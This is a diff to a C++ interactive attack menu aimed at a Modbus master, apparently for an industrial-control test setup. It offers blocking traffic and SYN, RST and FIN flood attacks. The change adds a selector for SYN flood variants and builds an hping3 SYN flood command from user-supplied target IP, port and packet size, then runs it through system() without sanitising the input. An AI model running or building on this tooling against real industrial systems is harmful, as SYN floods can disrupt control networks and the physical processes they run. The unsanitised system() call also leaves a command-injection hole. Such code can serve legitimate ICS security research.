@@ -24,8 +24,14 @@ enum tcpfloodattacktypes {
      FLOOD=1,
      FIXEDDURATION,
      FASTPACKETCOUNTFLOOD,
-     PACKETSPERSEC
+     PACKETSPERSEC,
+     ENDOFENUM
 };
+string floodAttackString[ENDOFENUM-1]={"FLOOD",
+                                       "FIXEDDURATION",
+                                       "FASTPACKETCOUNTFLOOD",
+                                       "PACKETSPERSEC",
+                                       };
 
 string globalDisplayString = "Please select a Cyber Attack To Perform.\n 1. Block the communication towards master.\n 2. Unblock Traffic \n 3. Execute a SYN flood attack towards the Modbus Master\n 4. Execute a TCP RST attack towards the Modbus Master\n 5. Execute a TCP FIN attack towards the Modbus Master\n";
 
@@ -42,6 +48,7 @@ void unblockTraffic(const string ip, const string port);
 
 // TCP flood options
 void tcpSynFloodAttack(void);
+tcpfloodattacktypes selectTcpSynFloodAttack(void);
 
 int main(int argv,char *argc[])
 {
@@ -172,16 +179,33 @@ void unblockTraffic(const string ip,const string port)
 void tcpSynFloodAttack(void)
 {
     
-
+   tcpfloodattacktypes tcpAttackType = selectTcpSynFloodAttack();
+   print("Flood Attack Type" << tcpAttackType<<endl);
    string packetCount="",packetSize="",port="",targetIP="";
-   print("Input the number of packets to send :: ");
-   getline(cin,packetCount);
    print("Input the size of each packet to send :: ");
    getline(cin,packetSize); 
    print("Input the ip of the target Master :: ");
    getline(cin,targetIP); 
    print("Input the port of the target Master :: ");
    getline(cin,port); 
+
+   switch(tcpAttackType)
+   {
+      case FLOOD:
+        break;
+      case FIXEDDURATION:
+        break;
+      case FASTPACKETCOUNTFLOOD:
+        break;
+      case PACKETSPERSEC:
+        break;
+      default:
+        break;
+   }
+
+   print("Input the number of packets to send :: ");
+   getline(cin,packetCount);
+
    string commandStr= "hping3 -c " + packetCount + 
                       " -d " + packetSize +
                       " -S -w 64 -p " + port +
@@ -194,4 +218,25 @@ void tcpSynFloodAttack(void)
   print(commandStrWithoutFlood<<endl);
   system(commandStrWithoutFlood.c_str());
                       
+}
+tcpfloodattacktypes selectTcpSynFloodAttack(void)
+{
+  
+  string displayStr="";
+  string numstr="";
+  int i =FLOOD-1;
+  for( ;i<ENDOFENUM-1;i++)
+  {
+   numstr=static_cast<ostringstream *>(&(ostringstream() << (i+1)) )->str();
+   displayStr += numstr + "."+floodAttackString[i]+" \n";
+  }
+  print(displayStr);
+  print("Select the type of SYN Flood attack to carry out :: ");
+  string inputStr="";
+  getline(cin,inputStr);
+  stringstream inputStream(inputStr);
+  int floodOption=-1;
+  inputStream >> floodOption;
+
+  return (tcpfloodattacktypes)floodOption;
 }
